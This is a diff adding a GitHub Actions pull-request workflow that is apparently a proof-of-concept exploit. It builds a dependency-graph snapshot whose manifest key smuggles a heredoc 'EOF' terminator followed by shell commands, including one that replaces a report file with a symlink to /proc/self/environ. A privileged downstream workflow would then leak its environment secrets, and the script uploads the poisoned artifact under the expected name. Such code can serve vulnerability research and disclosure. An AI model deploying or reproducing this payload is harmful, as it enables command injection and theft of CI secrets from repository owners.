@@ -1,0 +1,76 @@
+name: PR Workflow
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker-controlled dependency graph
+        env:
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_NUM: ${{ github.event.number }}
+        run: |
+          mkdir -p dependency-graph-reports
+          python3 - <<'PY'
+          import json, os
+
+          head = os.environ['HEAD_SHA']
+          n = os.environ['PR_NUM']
+
+          evil_key = (
+              "poc-manifest\n"
+              "EOF\n"
+              "id\n"
+              "echo INJECTED_COMMAND_RAN_$RANDOM\n"
+              "rm -f openssf-report.html\n"
+              "ln -s /proc/self/environ openssf-report.html\n"
+              "exit 0\n"
+          )
+
+          snapshot = {
+              "version": 0,
+              "job": {"correlator": "poc-eof", "id": "poc-eof"},
+              "sha": head,
+              "ref": "refs/pull/%s/head" % n,
+              "detector": {"name": "poc-eof", "version": "1.0.0", "url": "https://example.com"},
+              "manifests": {
+                  "build.gradle.kts": {
+                      "name": "build.gradle.kts",
+                      "file": {"source_location": "build.gradle.kts"},
+                      "resolved": {
+                          "pkg:maven/org.apache.commons/commons-lang3@3.12.0": {
+                              "relationship": "direct",
+                              "dependencies": [],
+                          }
+                      },
+                  },
+                  evil_key: {
+                      "name": "poc-manifest",
+                      "file": {"source_location": "poc-manifest"},
+                      "resolved": {
+                          "pkg:maven/com.example/evil@1.0.0": {
+                              "relationship": "direct",
+                              "dependencies": [],
+                          }
+                      },
+                  },
+              },
+          }
+          with open("dependency-graph-reports/snapshot.json", "w") as f:
+              json.dump(snapshot, f)
+          print("wrote snapshot for", head)
+          PY
+          ls -la dependency-graph-reports
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_snapshot.json
+          path: |
+            dependency-graph-reports/snapshot.json
+            payload-marker.txt
